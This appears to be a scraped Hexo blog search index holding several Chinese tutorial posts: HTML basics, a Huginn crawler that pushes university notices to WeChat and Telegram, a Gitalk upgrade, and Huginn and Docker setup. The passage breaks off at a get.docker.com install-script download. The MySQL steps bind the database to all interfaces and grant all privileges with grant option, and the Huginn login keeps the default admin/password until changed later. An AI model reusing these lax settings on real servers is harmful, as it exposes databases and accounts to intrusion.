桔子 有序列表Ordered list 列表项目默认使用数字进行标记。 &lt;ol> &lt;li>First item&lt;/li> &lt;li>Next item&lt;/li> &lt;/ol> First item Next item 有序列表也可以定义不同的样式 数字列表&lt;ol type=\"1\"> &lt;li>苹果&lt;/li> &lt;li>香蕉&lt;/li> &lt;li>柠檬&lt;/li> &lt;li>桔子&lt;/li> &lt;/ol> 苹果 香蕉 柠檬 桔子 字母列表大写字母 &lt;ol type=\"A\"> &lt;li>苹果&lt;/li> &lt;li>香蕉&lt;/li> &lt;li>柠檬&lt;/li> &lt;li>桔子&lt;/li> &lt;/ol> 苹果 香蕉 柠檬 桔子 小写字母改成 &lt;ol type=\"a\"&gt; 即可。 罗马字母列表&lt;ol type=\"I\"> &lt;li>苹果&lt;/li> &lt;li>香蕉&lt;/li> &lt;li>柠檬&lt;/li> &lt;li>桔子&lt;/li> &lt;/ol> 苹果 香蕉 柠檬 桔子 小写罗马字母则为 &lt;ol type=\"i\"&gt; 。 苹果 香蕉 柠檬 定义列表Definition list 自定义列表不仅仅是一列项目，而是项目及其注释的组合。 自定义列表以 &lt;dl&gt; 标签开始。每个自定义列表项以 &lt;dt&gt; 开始。每个自定义列表项的定义以 &lt;dd&gt; 开始。 &lt;dl> &lt;dt>First term&lt;/dt> &lt;dd>Definition&lt;/dd> &lt;dt>Next term&lt;/dt> &lt;dd>Definition&lt;/dd> &lt;/dl> First term Definition Next term Definition 嵌套列表&lt;ul> &lt;li>咖啡&lt;/li> &lt;li>茶 &lt;ul> &lt;li>红茶&lt;/li> &lt;li>绿茶 &lt;ul> &lt;li>中国茶&lt;/li> &lt;li>非洲茶&lt;/li> &lt;/ul> &lt;/li> &lt;/ul> &lt;/li> &lt;li>牛奶&lt;/li> &lt;/ul> 咖啡 茶 红茶 绿茶 中国茶 非洲茶 牛奶 块可以通过 &lt;div&gt; 和 &lt;span&gt; 将 HTML 元素组合起来。 大多数 HTML 元素被定义为块级元素或内联元素。“块级元素” block level element，“内联元素” inline element。 块级元素在浏览器显示时，通常会以新行来开始（和结束）。 内联元素在显示时通常不会以新行开始。 div 元素division/section 可以说是最常用的块级元素8。可用于组合其他 HTML 元素的容器。 它没有特定的含义。除此之外，由于它属于块级元素，浏览器会在其前后显示折行。 如果与 CSS 一同使用，&lt;div&gt; 元素可用于对大的内容块设置样式属性。 &lt;div&gt; 元素的另一个常见的用途是文档布局。 span 元素内联元素，可用作文本的容器。 也没有特定的含义。 也可以与 CSS 一同使用，来给部分文本定义样式属性。 类class属性 可以用来给同一类元素设置相同的样式。 设置 &lt;div&gt; 元素的类，使我们能够为相同的 &lt;div&gt; 元素设置相同的样式： &lt;style> .miaotest { background-color:pink; color:white; margin:20px; padding:20px; } &lt;/style> &lt;div class=\"miaotest\"> &lt;p>London&lt;/p> &lt;p>London is the capital city of England. It is the most populous city in the United Kingdom, with a metropolitan area of over 13 million inhabitants.&lt;/p> &lt;/div> &lt;div class=\"miaotest\"> &lt;p>Paris&lt;/p> &lt;p>Paris is the capital and most populous city of France.&lt;/p> &lt;/div> .miaotest { background-color:pink; color:white; margin:20px; padding:20px; } London London is the capital city of England. It is the most populous city in the United Kingdom, with a metropolitan area of over 13 million inhabitants. Paris Paris is the capital and most populous city of France. 同理，也可以设置 &lt;span&gt; 元素的class属性来对相同类设置样式。 &lt;style> span.redtest {color:red;} &lt;/style> &lt;p>My &lt;span class=\"redtest\">Important&lt;/span> Things&lt;/p> span.redtest {color:red;} My Important Things 网页布局这里 HTML5 新增了不少语义化元素，替代了原先 &lt;div id=\"xxx\"&gt;这样定义网页布局的形式。 具体的语义元素是这样的。 语义元素 含义 header 定义文档或节的页眉 nav 定义导航链接的容器 section 定义文档中的节 article 定义独立的自包含文章 aside 定义内容之外的内容（比如侧栏） footer 定义文档或节的页脚 details 定义额外的细节 summary 定义 details 元素的标题 例如： &lt;body> &lt;header> &lt;h1>City Gallery&lt;/h1> &lt;/header> &lt;nav> London&lt;br> Paris&lt;br> Tokyo&lt;br> &lt;/nav> &lt;section> &lt;h1>London&lt;/h1> &lt;p> London is the capital city of England. It is the most populous city in the United Kingdom, with a metropolitan area of over 13 million inhabitants. &lt;/p> &lt;p> Standing on the River Thames, London has been a major settlement for two millennia, its history going back to its founding by the Romans, who named it Londinium. &lt;/p> &lt;/section> &lt;footer> Copyright W3School.com.cn &lt;/footer> &lt;/body> 具体后面再看看 HTML5 的新语义元素吧（ 框架通过使用框架，可以在同一个浏览器窗口中显示不止一个页面。 每份HTML文档称为一个框架，并且每个框架都独立于其他的框架。 结构框架标签 framesetframeset标签 / 框架集 它定义了如何将窗口分割为框架。每个 frameset 定义了一系列 行 或 列。 rows/columns 的值规定了每行或每列占据屏幕的面积。 框架标签 frameframe 标签定义了放置在每个框架中的 HTML 文档。 例如，下面这个例子定义了一个两列框架集，第一列占窗口的25%，显示frame_a.htm；第二列占75%，显示frame_b.htm。 &lt;html> &lt;frameset cols=\"25%,75%\"> &lt;frame src=\"frame_a.htm\"> &lt;frame src=\"frame_b.htm\"> &lt;/frameset> &lt;/html> 假如一个框架有可见边框，用户可以拖动边框来改变它的大小。为了避免这种情况发生，可以在 &lt;frame&gt; 标签中加入：noresize=\"noresize\"。 即（此处分成两行rows） &lt;frameset rows=\"25%,75%\"> &lt;frame src=\"frame_a.htm\" noresize=\"noresize\"> &lt;frame src=\"frame_b.htm\"> &lt;/frameset> noframes 标签不能将 &lt;body&gt;&lt;/body&gt; 标签与 &lt;frameset&gt;&lt;/frameset&gt; 标签同时使用！ 不过，假如添加包含一段文本的 &lt;noframes&gt; 标签，就必须将这段文字嵌套于 &lt;body&gt;&lt;/body&gt; 标签内。 &lt;html> &lt;frameset cols=\"25%,50%,25%\"> &lt;frame src=\"/example/html/frame_a.html\"> &lt;frame src=\"/example/html/frame_b.html\"> &lt;frame src=\"/example/html/frame_c.html\"> &lt;noframes> &lt;body>您的浏览器无法处理框架！&lt;/body> &lt;/noframes> &lt;/frameset> &lt;/html> 混合框架结构&lt;html> &lt;frameset rows=\"50%,50%\"> &lt;frame src=\"/example/html/frame_a.html\"> &lt;frameset cols=\"25%,75%\"> &lt;frame src=\"/example/html/frame_b.html\"> &lt;frame src=\"/example/html/frame_c.html\"> &lt;/frameset> &lt;/frameset> &lt;/html> 内嵌框架Iframe 用于在网页内显示网页。 height 和 width 属性用于规定 iframe 的高度和宽度。 属性值的默认单位是像素，但也可以用百分比来设定（比如 “80%”）。 对于不支持iframe的浏览器，可以把需要的提示文本放置在 &lt;iframe&gt; 和 &lt;/iframe&gt; 之间。 比如这里嵌套了一个我的博客首页（套娃嘻嘻嘻 &lt;iframe src=\"https://miaotony.xyz\" width=\"600\" height=\"400\">您的浏览器不支持iframe唉&lt;/iframe> --- iframe 可用作链接的目标（target）。 链接的 target 属性必须引用 iframe 的 name 属性： &lt;iframe src=\"https://miaotony.xyz\" width=\"600\" height=\"200\" name=\"iframe_miao\">&lt;/iframe> &lt;p>&lt;a href=\"https://miaotony.xyz/friends\" target=\"iframe_miao\">friends&lt;/a>&lt;/p> friends （可能部署博客的时候这里用不了 脚本script 元素 &lt;script&gt; 标签用于定义客户端脚本，比如 JavaScript。 script 元素既可包含脚本语句，也可通过 src 属性指向外部脚本文件。 &lt;noscript&gt; 标签提供无法使用脚本时的替代内容。 &lt;script type=\"text/javascript\"> function sayhello(){ alert(\"Hello World!\"); } &lt;/script> &lt;noscript>Sorry, your browser does not support JavaScript!&lt;/noscript> function sayhello(){ alert(\"Hello World!\"); } Sorry, your browser does not support JavaScript!点这里试试呗~ 后面学JavaScript再慢慢看（ 字符实体HTML 中的预留字符必须被替换为字符实体。 形式类似于这样 &amp;entity_name; &amp;#entity_number;如 &amp;lt; 或 &amp;#60; 表示小于号 &lt; 。 不间断空格 &amp;nbsp; URL 编码URL，Uniform Resource Locator，统一资源定位符。 URL 只能使用 ASCII 字符集来通过因特网进行发送。 URL 编码会将字符转换为可通过因特网传输的格式。 它使用 “%” 其后跟随两位的十六进制数来替换非 ASCII 字符。 URL 不能包含空格。URL 编码通常使用 + 来替换空格。 （之前玩CTF就遇到过一个题，它的某个参数里需要输入加号（+），所以要写成 %2b。 小结入门就到这里了吧emmm 虽然有点枯燥，但所见所得还是挺有趣的哈哈哈。 进阶再来看看HTML的表单与输入，还有H5中的新元素，画布、音视频等等。 溜了溜了 嘻嘻嘻 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","path":"2020/02/14/FrontEnd_HTML_Basic/"},{"title":"小想法 | 利用Huginn&TelegramBot实现教务通知自动爬取与推送","text":"前言前不久在服务器上装好了Huginn（详见这里：基于Docker搭建Huginn）。 这几天折腾了一下，尝试着用它来爬点东西玩一下（bushi 想了一下，平时会关注教务的通知，每次都要访问教务网站，虽然说也不是很麻烦，但我想要一个自动推送的工具。或者说，不需要我主动去看有没有新通知，而是有新通知公告了就直接推过来。（类似于Webhook？ 😃 说到这个，其实之前在 RSSHub 上看到过一个，不过现在好像失效了。考虑到目前没有折腾 RSSHub 的打算，干脆就用 Huginn 自己弄一个好了。 说干就干了啦。 哦对了，最终的效果大概这样—— 通知的爬取与其说专门打造一个教务通知公告的爬取，不如说记录一下 Huginn 的基本使用方法。 说实话，Huginn 的资料真的少，感觉国内都没有多少介绍这个的，于是遇到了不少问题经常不知道怎么办emmm。 一些小介绍打开你喜欢的浏览器，进入 Huginn（默认为 127.0.0.1:3000），最上方有如下几个选项。 其中Agents就是你的一个个小兵，他们可以互相协作，按照流水线依次完成各自的使命。 Scenarios 就是这些小兵的集合，或者说是某种场景，官方描述是 Scenarios are named groups of Agents. Scenarios allow you to organize your agents, and to import and export sets of Agents to share. 比如说你有A、B、C三个Agent，他们共同完成一个任务，你就可以把他们集合起来作为一个Scenario。 Events 是小兵们收集来的信息。 Credentials 用来记录一些常量，或者说是环境变量。 Credentials are used to store values used by many Agents. Examples might include “twitter_consumer_secret”, “user_full_name”, or “user_birthday”. 在使用时，就可以像 {% credential Meow_API %} 这样来引用，其中 Meow_API 在 Credentials 中进行定义。 大体思路Huginn 里有很多种 Agent，这里用到的可以说是最常用的 Website Agent 和 Post Agent 。 更多的可以参考官方 Wiki 的介绍，在这里。 这个项目的思路就是 访问教务网站，爬取通知公告栏的标题及链接 根据得到的链接，访问相应网址，获得通知具体内容 将得到的信息打包，根据 Server Chan 和 Telegram Bot API 的格式发送即可 创建获取信息的 AgentCrawler_AAO #1 Get Notice URLs 选择 Website Agent，界面如下： Name自己取个喜欢的名字。 Schedule可以指定运行的周期。如果列表里没有合适的选项的话，可以选择Never，再另外创建一个Scheduler Agent，以cron格式自己写一个，然后在Controllers里指向这个Scheduler Agent。 Keep events可以定义获得Events后保留的时间，过期后自动会删除之前的Events。每次爬取后，获得新的数据才作为一个event，否则不会触发一个新的event，可以说在一定程度上起到了去重的作用。（当然如果还有重复的话，可以后面再加一个De-duplication Agent） 如果数据量过大的话最好不要设成Forever。但是要确保在下一个 Agent 能够在 Event 过期之前获取到数据。 Sources就是上一个Agent，Receivers就是下一个Agent。勾选Propagate immediately的话，上一个Agent获取到数据后则立即执行这个Agent，否则会间隔一分钟再执行。（开启会加重CPU负担） Scenarios就是那个Agents的集合啦。 Options里是具体的配置，是JSON的格式，可以参考右边的提示来进行设置。 怎么说好呢，其实简单的参数右边是有了，但是实际配置的时候还是有不少问题。看官方文档吧emmm https://huginnio.herokuapp.com/agents 这里有关于Agents各自API的详细介绍。 下面是options的具体介绍。 Website Agent可以爬取来自url/url_from_event/data_from_event的信息。 type可以xml, html, json, or text。相应的类型有各自的介绍，这里是HTML网页，就用html好了。 mode可以是all, on_change, or merge。If you specify merge for the mode option, Huginn will retain the old payload and update it with new values. 即如果选择merge，则会与之前的信息合并，这个在获取教务通知的具体内容时会用到，之后不再赘述。这里只需要在出现新通知的时候触发，所以用on_change。 extractextract里就是要解析的内容，可以用a CSS selector in css or an XPath expression in xpath. （如果type里选text则可以用regexp正则匹配，然而如果要html提取后再正则匹配就需要再来一个Agent，感觉有点蠢emmm如果有更好的办法欢迎来和我交流一下哈） 要注意的是：这个解析的内容是根据url浏览后直接获得的页面，没有加载文本之外的任何内容，没有经过JavaScript渲染等等。或者说就是你F12在Network里看到的页面加载出来的document或xhr之类得到的response。（这个是在利用 Huginn 爬取其他网站的时候发现的） 如果需要爬取JavaScript加载的网页，可以使用 Phantom Js Cloud Agent，这个需要在PhantomJs Cloud申请一个API，有一定的免费额度。这个Agent会返回页面的相应信息，还可以具体设置输出JSON、截图等等。 extract里以JSON格式写要解析的对象，后面就会返回 相应名字作为Key，相应的值作为Value 的JSON结果。 CSS可以这样找↓，直接复制CSS路径，再进行缩略处理。 比如这里复制出来是 html body div.container-fluid div.main-content.clearfix div.left-content div.notice-announcement div#index_notice_content.tab-content div.tab-pane.active ul.tab-pane-ul li div.inform-content a 然后处理 css path。 原始路径过长，删去不带 . 或 # 的节点（节点间以空格“ ”分割），并删去每个节点在 . 或 #前的第一个标签，得到： .container-fluid .main-content.clearfix .left-content .notice-announcement #index_notice_content.tab-content .tab-pane.active .tab-pane-ul .inform-content a 前半部分对节点定位用处不大，继续缩略，于是得到 .tab-pane.active .tab-pane-ul .inform-content a 非常规情况处理： a. 有些路径中的节点带空格，如&lt;div class=\"packery-item article\"&gt;,路径中的空格由.代替，截取为.packery-item.article b. 当抓取多种 css path 规则时，用逗号,分割 \"css\": \".focus-title .current a , .stress h2 a\", value用来提取标签中的属性，可以利用XPath functions。（中文介绍） Xpath Functions是可以进行嵌套来用的（套娃（x 这里用了 @href来提取链接，用string(.)来提取这个css路径下的字符串，用 normalize-space函数来去除多余的空格。得到的JSON表达式如下。 \"extract\": { \"url\": { \"css\": \".tab-pane.active .tab-pane-ul .inform-content a\", \"value\": \"@href\" }, \"title\": { \"css\": \".tab-pane.active .tab-pane-ul .inform-content a\", \"value\": \"normalize-space(string(.))\" } } template除了上面这些，还可以设置User Agent，以及一个用Liquid模板语言编写的模板template等等。 Liquid markup language. Safe, customer facing template language for flexible web apps. Liquid官方仓库：https://github.com/Shopify/liquid。这里有关于Liquid语法的中文介绍：https://liquid.bootcss.com/。 Liquid也是可以嵌套的，利用管道 | 可以将处理后的结果送到下一个filter。 除了Liquid自带的filter，Huginn还提供了一些自己的用法，详见官方文档 Formatting Events using Liquid。 在这里，由于得到的 href 是相对地址（如 /2020/0208/c11066a193409/page.htm），为了得到绝对地址，在template中利用 {{ url | to_uri: _response_.url }} 进行处理。 （别说了，这几天找遍了XPath function和Liquid用法） 设好之后可以点击Dry Run来试试，看看运行的结果，再做进一步的修改。 于是最终得到的Crawler_AAO #1 Get Notice URLs Options 如下。 { \"expected_update_period_in_days\": \"2\", \"user_agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0\", \"url\": \"http://aao.nuaa.edu.cn/\", \"type\": \"html\", \"mode\": \"on_change\", \"extract\": { \"url\": { \"css\": \".tab-pane.active .tab-pane-ul .inform-content a\", \"value\": \"@href\" }, \"title\": { \"css\": \".tab-pane.active .tab-pane-ul .inform-content a\", \"value\": \"normalize-space(string(.))\" }, \"time\": { \"css\": \".tab-pane.active .tab-pane-ul .inform-data\", \"value\": \"normalize-space(.)\" } }, \"template\": { \"url\": \"{{ url | to_uri: _response_.url }}\" } } 创建获取内容的 AgentCrawler_AAO #2 Get Notice Contents 一样是Website Agent。 Sources选择第一步创建的Agent，即 Crawler_AAO #1 Get Notice URLs。 Options中的url就来自第一个Agent，于是可以用Liquid中的 {{url}} 。 mode 为 merge，合并之前的信息作为最终的输出。当然也可以利用模板template以及Liquid来调用之前获取的对象。 这里再利用Liquid中的strip_html用法，将所有的html标签去除，最终得到的content就只剩包含\\n的字符串了。（之前试了XPath Function里的normalize-space函数，发现所有文字都连一起了，丑死了emmm 最终得到如下的Options。 { \"expected_update_period_in_days\": \"2\", \"user_agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0\", \"url\": \"{{url}}\", \"type\": \"html\", \"mode\": \"merge\", \"extract\": { \"content\": { \"css\": \".wp_articlecontent\", \"value\": \".\" } }, \"template\": { \"content\": \"{{ content | strip_html }}\" } } 将通知推送到微信Crawler_AAO #3 WeChat Push 这里利用Server Chan提供的微信模板消息推送服务，之前也写过一篇：小想法 | 基于PushBear API实现微信消息推送。这次再来用一下呢。 现在 PushBear 一对多的推送需要绑定认证过的服务号了，但是个人的推送还是可以用的。 这次用的就是Huginn里的Post Agent啦。 method这个Agent的method可以是get, post, put, patch, and delete，基本的都能实现。 Server Chan那边说是用GET，但好像POST也行。 post_url填写Server Chan的API地址， https://sc.ftqq.com/{% credential YourServerChanAPI %}.send? 这里把API保存到了Credentials里，直接用Liquid模板调用就好了。 content_type这里用form（application/x-www-form-urlencoded）。 payloadAPI接口有两个参数，标题text（必须），描述desp（可选），支持Markdown语法。 这里自己定义就好了啦~ 怎么开心怎么来嘻嘻嘻。 \"payload\": { \"text\": \"【{{title}}】\", \"desp\": \"{{ url }}{% line_break %}{% line_break %}{{ content | replace: \\\"\\n\\\", \\\"\\n\\n\\\" }}\" } 要注意的是：如果直接在它的模板里修改参数信息，则带有\\的会自动转义为\\\\！ 因此直接写\\n不可行，而要点击Toggle View然后直接写\\n。或者也可以调用 Huginn 提供的方法 {% line_break %} 。 另一个问题，在Server Chan中\\n\\n才能换行，于是利用 Liquid 的 {{ content | replace: \\\"\\n\\\", \\\"\\n\\n\\\" }} 把\\n给替换成\\n\\n。（需要直接写，不能直接在参数的框里改。 还要注意保存后如果再次修改则\\n又会自动变为\\\\n，注意留意。建议保存之前先Dry Run试试。 emit_events如果设为true，则会返回一个Event，可以再加一个Agent来判断是否发送成功。 例如某次发送成功后得到的Event如下，其中的body部分为返回的数据。 { \"body\": \"{\\\"errno\\\":0,\\\"errmsg\\\":\\\"success\\\",\\\"dataset\\\":\\\"done\\\"}\", \"status\": 200, \"headers\": { \"Server\": \"nginx\", \"Date\": \"Tue, 10 Feb 2020 09:00:51 GMT\", \"Content-Type\": \"text/html;charset=utf-8\", \"Transfer-Encoding\": \"chunked\", \"Connection\": \"keep-alive\", \"Expires\": \"Thu, 01 Jan 1970 00:00:01 GMT\", \"Cache-Control\": \"no-cache, must-revalidate\", \"Pragma\": \"no-cache\", \"Via\": \"100167\", \"Set-Cookie\": \"PHPSESSID=xxxxxxxxxx; expires=Wed, 11-Feb-2020 09:00:51 GMT; path=/; domain=sc.ftqq.com; HttpOnly\", \"Content-Length\": 47 } } 将通知推送到Telegram ChannelCrawler_AAO #3 Telegram Channel Push 同样使用的是Post Agent。（看了一下，Telegram Agent好像不大灵活，而且还需要先有一个Event Formatting Agent，让Event中包含either a text, photo, audio, document or video key.） 昨天研究了好久Telegram Bot，看了看官方API文档，发现没有想象中的那么困难233333。 首先 @BotFather 注册一个TGBot，得到token。 这里没有设置Webhook，只需要用到sendMessage方法就好了。 post_urlURL为https://api.telegram.org/bot&lt;token&gt;/sendMessage，将&lt;token&gt;部分换成自己的Bot token，可以保存到Credentials里。 如https://api.telegram.org/bot123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11/sendMessage 可以先用 PostMan 测试一下。 别忘了bot……（是我了 methodPOST or GET content_type URL query string application/x-www-form-urlencoded application/json (except for uploading files) multipart/form-data (use to upload files) payload参数列表如下 也可以使用Markdown语法。（还别说，真挺好 其实还有一个问题，我部署Huginn的服务器是在墙内的，于是还需要想办法转发出去。 具体自己想办法了啦。 （折腾了半天用 heroku 搭了一个自己凑合着用 小结其实最初是想看看Huginn怎么用的，折腾过程中还去看了Liquid模板语法，XPath Functions用法。 推送到微信的前几天就弄好了，昨天想看看TG Bot怎么玩，于是研究了一下Bot API，顺便又写了个推送到TG Channel的。 最终的效果—— 每隔一段时间，Huginn 就会派出一个Agent小兵，去看一看教务有没有新的通知公告。 噢来了呀！Agent带回来了一个新的Event，快把它推给主人吧！ Ding~ 微信来了一条新信息。 TG的Channel那边也来了。 嗯，这个感觉就很棒，朴实无华，且枯燥。（然而并没有钱 emmm 24号开始就要网上上课了。 以上内容仅供学习研究，请勿用于非法用途。 噢对了，TG Channel的邀请链接在这个域名里找嘻嘻嘻—— _tg_aaonotice.miaotony.xyz 就在我部署这篇文章的时候，发现所有的 非代码块内的 Liquid语言全部被hexo认为是代码了emmm 我忘记hexo也用了Liquid了。。（感觉蠢死了 于是把需要在所有的 {{xxx}}和{% xxx %}外面套一层 {% raw %} ... {% endraw %}如果要写上面这个raw，需要写两个（类似于转义）。 Reference Huginn Wiki Formatting Events using Liquid Liquid 中文文档 Huginn Agent 文档 Telegram Bot官方API文档 RSS 进阶篇：Huginn - 真·为任意网页定制 RSS 源（PhantomJs 抓取） Huginn 实现自动通过 Telegram 推送豆瓣高分电影 XPath functions（中文介绍） etc. document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","path":"2020/02/11/Idea_Huginn_AAONoticeAutoPush/"},{"title":"Blog折腾记 | 升级Gitalk评论插件以解决EmailBombs","text":"起因这几天我的邮箱被 GitHub 轰炸了emmm。 具体大概是这样的—— 说好的 Depending on your API usage, we’ll be sending you this email reminder at most once every 3 days. 然而从2月4日开始每天都有一堆…… 所以这到底是什么回事呢？ 我一想，用到这个 API 的只有我博客的 Gitalk 评论插件。目前我博客的评论都放在了GitHub项目的issue里，每篇文章浏览到下面的时候会自动加载评论，这时候就会向GitHub的API发请求从而获取相应数据。 解决方案于是去 gitalk 的官方仓库看了看，果然2月4日当天就有人提issue了，看来不少人 Email Bombs 了23333（摊手。 https://github.com/gitalk/gitalk/issues/343 很多大佬对这个问题进行了讨论，当然也有不少 +1 Mark之类的在旁观。 方案一2月4日这样，@geektutu 给出了一个 Use read-only personal access token to replace clientID &amp; clientSecret 的方案，并提了PR，详见：#344。这个PR在2月6日merge了。 根据他的建议，首先需要更新 gitalk.min.js文件，如果想获得更多的API使用量，需要在 accessToken 里生成一个只读的token，而后修改 Gitalk 模板里的配置，新增accessToken项。 const gitalk = new Gitalk({ clientID: 'GitHub Application Client ID', clientSecret: 'GitHub Application Client Secret', accessToken: 'Github Personal Access Token', // IMPORTANT !!! repo: 'GitHub repo', owner: 'GitHub repo owner', ... }) 根据 Understanding scopes for OAuth Apps ，在新建 access token 时不选择任何选项，则生成的token只有公开信息的只读权限（Grants read-only access to public information (includes public user profile info, public repository info, and gists)）。 6号我也更新了这一版本，做了相应的修改，的确邮箱不被轰炸了。😂 但是，这个 access token 在任何人访问博客的时候都是公开可见的，不免存在风险，这也在issue里有过讨论。@geektutu 也说这是个临时方案。 方案二2月7日，这个issue的发起者 @fletchto99 给出了他的方案，并提了PR，详见：gitalk/gitalk#346 利用原来的client_id 和 client_secret 作为 basic auth 是可行的。 按照他的方案，不需要修改其他的任何配置，直接把Gitalk的js升级到V1.5.2 即可。 这样就方便了很多哈，试了一下果然是可行的。 而且这个可以说是最佳方案了呢！ 针对 Matery 主题的修改方法一对于我现在使用的 Matery 主题（hexo-theme-matery），只需要将 \\hexo\\themes\\matery\\source\\libs\\gitalk目录下的 gitalk.min.js和 gitalk.css 更新到最新版本（&gt;= V1.5.2）即可。 方法二当然也可以修改配置文件里引用的 JavaScript（、CSS）地址为链接版本。 目前 CDN 上的 Gitalk 已经更新到了最新版本。 打开\\hexo\\themes\\matery\\_config.yml，修改其中的 libs。 libs: css: # ... gitalk: https://cdn.jsdelivr.net/npm/gitalk/dist/gitalk.css # 或者 https://unpkg.com/gitalk/dist/gitalk.css # ... js: # ... gitalk: https://cdn.jsdelivr.net/npm/gitalk/dist/gitalk.min.js # 或者 https://unpkg.com/gitalk/dist/gitalk.min.js # ... 保存后，在 hexo 的目录下执行 hexo clean &amp;&amp; hexo g，再部署即可。 最后，顺手给 hexo-theme-matery 提了个PR，更新了这一依赖，详见 blinkfox/hexo-theme-matery#318 。 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","path":"2020/02/07/Blog_UpdateGitalk/"},{"title":"基于Docker搭建Huginn","text":"What is Huginn? Huginn is a system for building agents that perform automated tasks for you online. They can read the web, watch for events, and take actions on your behalf. Huginn’s Agents create and consume events, propagating them along a directed graph. Think of it as a hackable version of IFTTT or Zapier on your own server. You always know who has your data. You do. Huginn是一个神器，它是一个私人IFTTT，例如搭建任务采集触发平台，自动跟进实时提醒（用Email Slack Telegeram QQ 微信接收推送），全文 RSS 输出（把你关注的所有网页进行 RSS 全文输出），同时可以把各种app，软件，网络服务，网络设备等链接在一起做任务触发。 官方Github仓库：https://github.com/huginn/huginn 这个是我在玩爬虫的时候，偶然间在网上看到的一个工具，能做的事情还不少，觉得还挺不错的，这次就试着搭建一下吧。 Installation手动安装的话，需要下面这样一步步来，感觉好麻烦……（懒 The Huginn installation consists of setting up the following components: Packages / Dependencies Ruby System Users Database Huginn Nginx 但是，Huginn还提供了一种通过docker来搭建的方式，可以免去配环境的烦恼，感觉贼好~ 官方的文档在这里。 1. 安装 Docker可以参考这里。 2. 安装 Huginn最简单的就直接 docker run -it -p 3000:3000 huginn/huginn 首先会把huginn给pull下来，然后运行。 然后访问 http://localhost:3000 可以看到 3. 登录利用username admin and password password登录，之后可以在Account里进行修改。 4. 配置开机自启docker update --restart=always huginn 好了，接下来就可以尽情感受huginn的魅力了！ Connect to local MySQL上面的安装方法是最简单的，默认会在Docker容器里安装MySQL数据库等环境。 但是如果本机就装了一个MySQL数据库，需要 huginn 共享的话， 或者说想要huginn连接到本地数据库，可以像下面这样安装。 1. 安装 Docker同上。 2. 配置 MySQL2.1 修改绑定的IP为 0.0.0.0这是为了让docker能连接到本地的数据库。 默认的 127.0.0.1 只能从本地访问。 MySQL： vim /etc/mysql/mysql.conf.d/mysqld.cnf 修改 bind-address = 0.0.0.0然后 重启 sudo systemctl restart mysql MariaDB： /etc/mysql/mariadb.cnf包含了下面的所以.cnf文件 !includedir /etc/mysql/conf.d/ !includedir /etc/mysql/mariadb.conf.d/我这里的在下面这个文件里 vim /etc/mysql/mariadb.conf.d/50-server.cnf 同样修改 bind-address = 0.0.0.0 而后 重启 sudo systemctl restart mysql 2.2 MySQL里新建 huginn 用户当然也可以让huginn直接以root用户来访问数据库，那就直接跳到2.3节。 不过安全起见，还是新建一个用户吧。 以root登录MySQL / MariaDB mysql -u root -p 新建huginn用户，密码为PASSWORD create user 'huginn'@'%' identified by 'PASSWORD'; 这个是允许从任意地方登录。 如果要限制从docker里启动，先ifconfig看下 docker0 的IP，一般是172.17.0.1，则 docker IP 为172.17.0.*，于是 create user 'huginn'@'172.17.0.%' identified by 'PASSWORD'; 2.3 赋予权限GRANT ALL PRIVILEGES ON *.* TO 'huginn'@'172.17.0.%' IDENTIFIED BY 'PASSWORD' WITH GRANT OPTION; flush privileges; 如果限制访问的数据库则修改*.*为相应的数据库即可。 3. 配置 firewall如果启用了 firewall 的话，需要放行本地的3306端口（即数据库的相应端口）。 Ubuntu： sudo ufw allow 3306 CentOS： sudo firewall-cmd --zone=public --add-port=3306/tcp --permanent # 开放端口 sudo systemctl restart firewalld.service # 重启firewall 4. 安装 Huginn首次安装： docker run --name huginn \\ -p 3000:3000 \\ --restart always \\ -e MYSQL_PORT_3306_TCP_ADDR=172.17.0.1 \\ -e HUGINN_DATABASE_NAME=huginn \\ -e HUGINN_DATABASE_USERNAME=huginn \\ -e HUGINN_DATABASE_PASSWORD=PASSWORD \\ huginn/huginn 这里建了一个名为huginn的数据库。 172.17.0.1是本地的IP，即在ifconfig看到的 docker0 的IP。确保在本地可以通过这个IP连上数据库。 之后直接这样即可↓。 docker start huginn 上面首次安装时已经配置了开机自启。 当然也可以这样配置—— docker update --restart=always huginn 好了，完工！ Referencehttps://github.com/huginn/huginn https://www.jianshu.com/p/d272a09ba686 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","path":"2020/02/03/Server_Huginn/"},{"title":"Docker安装及常用命令","text":"简介 Building and deploying new applications is faster with containers.Docker containers wrap up software and its dependencies into a standardized unit for software development that includes everything it needs to run: code, runtime, system tools and libraries. This guarantees that your application will always run the same and makes collaboration as simple as sharing a container image. Docker 是一个开源的应用容器引擎，基于 Go 语言 并遵从 Apache2.0 协议开源。 Docker 可以让开发者打包他们的应用以及依赖包到一个轻量级、可移植的容器中，然后发布到任何流行的 Linux 机器上，也可以实现虚拟化。 容器是完全使用沙箱机制，相互之间不会有任何接口（类似 iPhone 的 app）,更重要的是容器性能开销极低。 其实感觉上就是emmm 别人把整套环境都配置好打包好了，你直接拿过来用就好了！ 反正用起来贼方便就是了。 感觉docker的图标就挺好看的（ 安装curl -fsSL get.docker.com -o get-docker.sh sudo 